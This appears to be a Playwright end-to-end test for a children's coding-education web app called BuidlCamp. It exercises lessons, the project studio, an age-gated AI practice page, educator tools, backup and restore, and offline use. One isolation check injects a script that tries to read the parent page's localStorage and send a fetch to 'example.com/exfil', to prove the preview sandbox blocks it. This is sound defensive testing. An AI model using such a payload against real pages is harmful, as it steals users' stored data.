// Run after npm run build. Uses a local test companion with a fixture provider transport; never calls a paid provider.
const { createRequire } = require("node:module");
const { resolve } = require("node:path");
const fs = require("node:fs/promises");
const assert = require("node:assert/strict");
const runtime = process.env.BUIDLCAMP_PLAYWRIGHT_ROOT
  ? createRequire(
      resolve(process.env.BUIDLCAMP_PLAYWRIGHT_ROOT, "package.json"),
    )
  : require;
const engine = process.env.BUIDLCAMP_BROWSER || "chromium";
const browserType = runtime("playwright")[engine];
let base;
let companion;
let browser;
const output = resolve("test-results", engine);
(async () => {
  await fs.mkdir(output, { recursive: true });
  const { createApp } = await import("../server.mjs");
  companion = createApp(async () =>
    Response.json({
      choices: [
        {
          message: {
            content:
              "A loop repeats instructions. What happens after the third repeat?",
          },
        },
      ],
    }),
  );
  await new Promise((resolve) => companion.listen(0, "127.0.0.1", resolve));
  base = `http://127.0.0.1:${companion.address().port}`;
  browser = await browserType.launch({ headless: true });
  const context = await browser.newContext({
    viewport: { width: 1536, height: 1024 },
  });
  const page = await context.newPage();
  const setCode = async (text) => {
    const editor = page.getByRole("textbox", {
      name: "Project code",
      exact: true,
    });
    await editor.click();
    await editor.press("Control+a");
    await page.keyboard.insertText(text);
    await page.waitForFunction(
      (value) =>
        JSON.parse(localStorage.getItem("buidlcamp-workspace-v1")).projects[0]
          .code === value,
      text,
    );
  };
  page.setDefaultTimeout(10000);
  const errors = [];
  page.on("pageerror", (error) => errors.push(error.message));
  await page.goto(base);
  await page.getByLabel("What should we call you?").fill("Learner");
  await page.getByRole("button", { name: "Create my workspace" }).click();
  await page
    .getByRole("heading", { name: "Small steps. Real skills." })
    .waitFor();
  assert.equal(
    await page
      .locator("body")
      .evaluate(
        (el) =>
          [...el.childNodes].filter(
            (n) => n.nodeType === Node.TEXT_NODE && n.textContent.trim(),
          ).length,
      ),
    0,
  );
  await page.screenshot({ path: output + "/home-desktop.png", fullPage: true });
  assert.equal(
    await page.evaluate(
      () => document.documentElement.scrollWidth > innerWidth,
    ),
    false,
  );
  await page.getByRole("link", { name: "Start learning", exact: true }).click();
  await page.getByRole("button", { name: "Start lesson", exact: true }).click();
  await page.getByRole("button", { name: "Next reading", exact: true }).click();
  await page.reload();
  await page.getByText("Reading 2 of 4", { exact: true }).waitFor();
  while (
    await page
      .getByRole("button", { name: "Next reading", exact: true })
      .count()
  )
    await page
      .getByRole("button", { name: "Next reading", exact: true })
      .click();
  await page
    .getByRole("button", { name: "Check my understanding", exact: true })
    .click();
  // Answer the second question first to exercise sparse-answer persistence.
  await page
    .getByRole("radio", {
      name: "It runs them in the order you wrote, mistakes and all",
    })
    .check();
  await page.reload();
  await page
    .getByRole("radio", {
      name: "Take damage → Check HP → Game Over",
      exact: true,
    })
    .check();
  await page
    .getByRole("button", { name: "Make something", exact: true })
    .click();
  await page
    .getByLabel("Your work or reflection")
    .fill(
      "First I open the chest, take the item, equip it, find the target, then use it. I tested the order on paper.",
    );
  const checks = page.locator(".lesson-content input[type=checkbox]");
  for (let i = 0; i < (await checks.count()); i++) await checks.nth(i).check();
  await page
    .getByRole("button", { name: "Complete lesson", exact: true })
    .click();
  await page.getByRole("heading", { name: "You made progress." }).waitFor();
  await page.reload();
  await page.getByRole("heading", { name: "You made progress." }).waitFor();
  await page.getByRole("link", { name: "Project studio", exact: true }).click();
  await page
    .locator(".starter")
    .filter({
      has: page.getByRole("heading", { name: "Pixel painter", exact: true }),
    })
    .getByRole("button", { name: "Make a project" })
    .click();
  await page.getByRole("button", { name: "Run preview" }).click();
  await page
    .frameLocator('iframe[title="Project preview"]')
    .getByRole("button", { name: "Paint square 1", exact: true })
    .click();
  await page.screenshot({
    path: output + "/studio-desktop.png",
    fullPage: true,
  });
  await page
    .getByLabel("What did you change and test?")
    .fill("I painted a square and checked the button response.");
  const code = await page.evaluate(
    () =>
      JSON.parse(localStorage.getItem("buidlcamp-workspace-v1")).projects[0]
        .code,
  );
  await setCode(code + "\n<!-- Saved test edit -->");
  await page.getByRole("link", { name: "Home", exact: true }).click();
  await page.getByRole("link", { name: "Project studio", exact: true }).click();
  await page.getByRole("button", { name: "My projects", exact: true }).click();
  await page.getByRole("button", { name: "Open project", exact: true }).click();
  await page
    .getByRole("textbox", { name: "Project code", exact: true })
    .press("Control+End");
  assert.ok(
    (
      await page
        .getByRole("textbox", { name: "Project code", exact: true })
        .innerText()
    ).includes("Saved test edit"),
  );
  // Prove preview source cannot reach storage or send fetch requests.
  let escaped = false;
  await page.route("https://example.com/**", (route) => {
    escaped = true;
    return route.abort();
  });
  await setCode(
    '<body><script>try{parent.localStorage.getItem("buidlcamp-workspace-v1");document.body.innerText="ESCAPED"}catch{document.body.innerText="isolated"}fetch("https://example.com/exfil").catch(()=>{})</script>',
  );
  await page.getByRole("button", { name: "Run preview" }).click();
  await page
    .frameLocator('iframe[title="Project preview"]')
    .getByText("isolated", { exact: true })
    .waitFor();
  assert.equal(escaped, false);
  await setCode(code);
  await page.getByRole("button", { name: "Arcade", exact: true }).click();
  await page
    .getByRole("radio", { name: "If goalie is left, kick right", exact: true })
    .check();
  await page.getByRole("button", { name: "Next challenge" }).click();
  await page
    .getByRole("radio", { name: "ballClose && timerRunning", exact: true })
    .waitFor();
  await page
    .getByRole("button", { name: "Stadium rules", exact: true })
    .click();
  assert.equal(await page.locator(".seat-map span").count(), 60);
  await page
    .getByRole("button", { name: "Pixel animation", exact: true })
    .click();
  await page.getByRole("button", { name: "Pixel 1", exact: true }).click();
  assert.equal(
    await page
      .getByRole("button", { name: "Pixel 1", exact: true })
      .getAttribute("aria-pressed"),
    "true",
  );
  await page.getByRole("button", { name: "Copy to next frame" }).click();
  await page.getByRole("button", { name: "Frame 2", exact: true }).click();
  assert.equal(
    await page
      .getByRole("button", { name: "Pixel 1", exact: true })
      .getAttribute("aria-pressed"),
    "true",
  );
  await page
    .getByRole("navigation")
    .getByRole("link", { name: "AI practice", exact: true })
    .click();
  await page
    .getByText(
      "This provider’s learner workflow isn’t available for your age group.",
      { exact: false },
    )
    .waitFor();
  assert.equal(
    await page
      .getByRole("link", { name: "Open ChatGPT", exact: false })
      .count(),
    0,
  );
  await page.getByRole("button", { name: "Train a tiny model" }).click();
  await page.getByText("Model prediction", { exact: true }).waitFor();
  await page.getByRole("link", { name: "Educator desk", exact: true }).click();
  await page.getByLabel("Six-digit PIN", { exact: true }).fill("654321");
  await page.getByLabel("Confirm PIN", { exact: true }).fill("654321");
  await page.getByRole("button", { name: "Create PIN and continue" }).click();
  await page.getByRole("button", { name: "Assignments", exact: true }).click();
  await page.getByLabel("Assignment title").fill("My first sequence");
  await page
    .getByLabel("Instructions", { exact: true })
    .fill("Explain each step, then test the order.");
  await page
    .getByRole("checkbox", { name: "Step by Step", exact: true })
    .check();
  await page
    .getByRole("checkbox", { name: "If This, Then Boom", exact: true })
    .check();
  await page
    .getByRole("button", { name: "Save assignment", exact: true })
    .click();
  await page
    .getByRole("heading", { name: "My first sequence", exact: true })
    .waitFor();
  const assignmentDownload = page.waitForEvent("download");
  await page.getByRole("button", { name: "Download", exact: true }).click();
  const assignmentPath = output + "/assignment.json";
  await (await assignmentDownload).saveAs(assignmentPath);
  await page.getByRole("button", { name: "Lesson plans", exact: true }).click();
  await page
    .getByRole("heading", { name: "Assessment conversation" })
    .waitFor();
  await page.screenshot({
    path: output + "/educator-desktop.png",
    fullPage: true,
  });
  await page.getByRole("link", { name: "Settings", exact: true }).click();
  await page.getByLabel("Choose assignment file").setInputFiles(assignmentPath);
  await page
    .getByText("Assignment imported. Find it on Home.", { exact: true })
    .waitFor();
  const portfolioDownload = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Export learner portfolio", exact: true })
    .click();
  const portfolioPath = output + "/portfolio.json";
  await (await portfolioDownload).saveAs(portfolioPath);
  await page.getByRole("link", { name: "Educator desk", exact: true }).click();
  await page
    .getByRole("button", { name: "Portfolio review", exact: true })
    .click();
  await page
    .getByLabel("Import portfolio", { exact: true })
    .setInputFiles(portfolioPath);
  await page
    .getByLabel("Your feedback", { exact: true })
    .fill("Explain how your sequence handles a missing item.");
  const feedbackDownload = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Download feedback", exact: true })
    .click();
  const feedbackPath = output + "/feedback.json";
  await (await feedbackDownload).saveAs(feedbackPath);
  assert.match(await fs.readFile(feedbackPath, "utf8"), /missing item/);
  await page.getByRole("link", { name: "Settings", exact: true }).click();
  await page.getByLabel("Import educator feedback").setInputFiles(feedbackPath);
  await page
    .getByText(
      "Feedback matched to your submission. Choose one change to try.",
      { exact: true },
    )
    .waitFor();
  await page
    .getByLabel("What did you change after this feedback?")
    .fill("I added a step for finding the missing item before continuing.");
  await page
    .getByRole("button", { name: "Record my revision", exact: true })
    .click();
  await page
    .getByRole("button", { name: "Revision recorded", exact: true })
    .waitFor();
  await page.getByRole("link", { name: "Settings", exact: true }).click();
  const downloadPromise = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Export full backup", exact: true })
    .click();
  const backupDownload = await downloadPromise;
  const backupPath = output + "/backup.json";
  await backupDownload.saveAs(backupPath);
  const backup = JSON.parse(await fs.readFile(backupPath, "utf8"));
  assert.equal(backup.pin, null);
  assert.equal(backup.projects.length, 1);
  assert.equal(backup.reviews.length, 1);
  assert.ok(backup.lessons["cc1-sequences"].completedAt);
  await page.getByLabel("Restore workspace backup").setInputFiles(backupPath);
  await page
    .getByRole("button", { name: "Replace with backup", exact: true })
    .click();
  await page.getByText("Backup restored.", { exact: true }).waitFor();
  await page.getByLabel("Six-digit PIN", { exact: true }).fill("654321");
  await page.getByRole("button", { name: "Unlock", exact: true }).click();
  await page
    .getByRole("navigation")
    .getByRole("link", { name: "AI practice", exact: true })
    .click();
  await page
    .getByLabel("Your prompt", { exact: true })
    .fill(
      "Explain a loop to a beginner, using a fictional example and a question to check understanding.",
    );
  await page
    .getByRole("button", { name: "API key · adult access", exact: true })
    .click();
  const fixtureKey = "sk-fixture-only-never-a-real-key";
  await page.getByLabel("API key", { exact: true }).fill(fixtureKey);
  await page.getByLabel("Model ID", { exact: true }).fill("fixture-model");
  await page
    .getByRole("checkbox", {
      name: "I am an adult operating this demonstration.",
      exact: false,
    })
    .check();
  await page.getByRole("button", { name: "Send prompt", exact: true }).click();
  await page
    .getByText("Response received. Check its reasoning before using it.", {
      exact: true,
    })
    .waitFor();
  assert.equal(
    (await page.evaluate(() => JSON.stringify(localStorage))).includes(
      fixtureKey,
    ),
    false,
  );
  await page
    .getByRole("button", { name: "Practice without AI", exact: true })
    .click();
  await page
    .getByRole("button", { name: "API key · adult access", exact: true })
    .click();
  assert.equal(
    await page.getByLabel("API key", { exact: true }).inputValue(),
    "",
  );
  await page.getByRole("link", { name: "Credentials", exact: true }).click();
  await page.getByRole("button", { name: "All pathways", exact: true }).click();
  await page
    .locator(".credential-row")
    .filter({ hasText: "AI Fluency: Framework & Foundations" })
    .getByRole("button", { name: "View pathway" })
    .click();
  await page.getByRole("dialog").waitFor();
  await page.keyboard.press("Escape");
  assert.equal(await page.getByRole("dialog").count(), 0);
  await page.getByRole("link", { name: "Home", exact: true }).click();
  for (const viewport of [
    { width: 768, height: 1024 },
    { width: 1024, height: 768 },
    { width: 390, height: 844 },
  ]) {
    await page
      .getByRole("heading", { name: "Small steps. Real skills." })
      .waitFor();
    await page.setViewportSize(viewport);
    await page.screenshot({
      path: output + `/home-${viewport.width}.png`,
      fullPage: true,
    });
    assert.equal(
      await page.evaluate(
        () => document.documentElement.scrollWidth > innerWidth,
      ),
      false,
      `Overflow at ${viewport.width}`,
    );
    if (viewport.width < 901) {
      await page.getByRole("button", { name: "Toggle navigation" }).click();
      await page
        .getByRole("link", { name: "Project studio", exact: true })
        .click();
    } else {
      await page
        .getByRole("link", { name: "Project studio", exact: true })
        .click();
    }
    await page
      .getByRole("button", { name: "My projects", exact: true })
      .click();
    await page
      .getByRole("button", { name: "Open project", exact: true })
      .click();
    assert.equal(
      await page.evaluate(
        () => document.documentElement.scrollWidth > innerWidth,
      ),
      false,
      `Studio overflow at ${viewport.width}`,
    );
    await page.screenshot({
      path: output + `/studio-${viewport.width}.png`,
      fullPage: true,
    });
    if (viewport.width < 901) {
      await page.getByRole("button", { name: "Toggle navigation" }).click();
    }
    await page.getByRole("link", { name: "Home", exact: true }).click();
  }
  if (process.env.BUIDLCAMP_SKIP_OFFLINE === "1") {
    console.log(
      "SKIPPED by explicit override: offline navigation. Record the engine limitation separately.",
    );
  } else {
    await page.evaluate(() =>
      Promise.race([
        navigator.serviceWorker.ready,
        new Promise((_, reject) =>
          setTimeout(
            () => reject(new Error("Offline cache did not become ready")),
            10000,
          ),
        ),
      ]),
    );
    await page.reload();
    const testPort = companion.address().port;
    companion.closeAllConnections();
    await new Promise((resolve) => companion.close(resolve));
    await page.reload();
    await page
      .getByRole("heading", { name: "Small steps. Real skills." })
      .waitFor();
    await new Promise((resolve) =>
      companion.listen(testPort, "127.0.0.1", resolve),
    );
    console.log(
      "PASS: cached app reopens while its origin server is unavailable.",
    );
  }
  assert.deepEqual(errors, []);
  const recoveryContext = await browser.newContext();
  const recoveryPage = await recoveryContext.newPage();
  await recoveryPage.goto(base);
  await recoveryPage.evaluate(() =>
    localStorage.setItem("buidlcamp-workspace-v1", "{broken original"),
  );
  await recoveryPage.reload();
  await recoveryPage
    .getByRole("heading", { name: "Let’s protect your saved work" })
    .waitFor();
  assert.equal(
    await recoveryPage.evaluate(() =>
      localStorage.getItem("buidlcamp-workspace-v1"),
    ),
    "{broken original",
  );
  assert.equal(
    await recoveryPage
      .getByRole("button", { name: "Create my workspace" })
      .count(),
    0,
  );
  await recoveryContext.close();
  const starterContext = await browser.newContext();
  const starterPage = await starterContext.newPage();
  starterPage.setDefaultTimeout(10000);
  starterPage.on("pageerror", (error) => errors.push(error.message));
  await starterPage.goto(base);
  await starterPage
    .getByRole("button", { name: "Create my workspace" })
    .click();
  await starterPage
    .getByRole("link", { name: "Project studio", exact: true })
    .click();
  await starterPage.locator(".starter h2").first().waitFor();
  const starterNames = await starterPage
    .locator(".starter h2")
    .allTextContents();
  assert.equal(starterNames.length, 6);
  for (const name of starterNames.filter((name) => name !== "Pixel painter")) {
    await starterPage
      .locator(".starter")
      .filter({ has: starterPage.getByRole("heading", { name, exact: true }) })
      .getByRole("button", { name: "Make a project" })
      .click();
    await starterPage.getByRole("button", { name: "Run preview" }).click();
    const preview = starterPage.frameLocator('iframe[title="Project preview"]');
    await preview.locator("h1").waitFor();
    if (await preview.locator("#cookie").count())
      await preview.locator("#cookie").click();
    if (await preview.locator("#regen").count())
      await preview.locator("#regen").click();
    assert.ok((await preview.locator("body").innerText()).length > 10);
    await starterPage
      .getByRole("button", { name: "Starters", exact: true })
      .click();
  }
  assert.deepEqual(errors, []);
  await starterContext.close();
  console.log(
    "PASS: every retained starter loads and runs without script errors in the isolated preview.",
  );
  console.log(
    "PASS: reading/lesson resume, completion, project autosave/run/isolation, arcade labs, provider age gate, educator assignment/plan, backup export/restore, API UI with fixture transport and ephemeral key, dialogs, desktop/tablet/mobile layouts, corrupt-data protection.",
  );
})()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  .finally(async () => {
    const cleanupDeadline = setTimeout(
      () => process.exit(process.exitCode || 0),
      5000,
    );
    cleanupDeadline.unref();
    if (companion) {
      companion.closeAllConnections();
      await new Promise((resolve) => companion.close(resolve));
    }
    await browser?.close();
    clearTimeout(cleanupDeadline);
  });
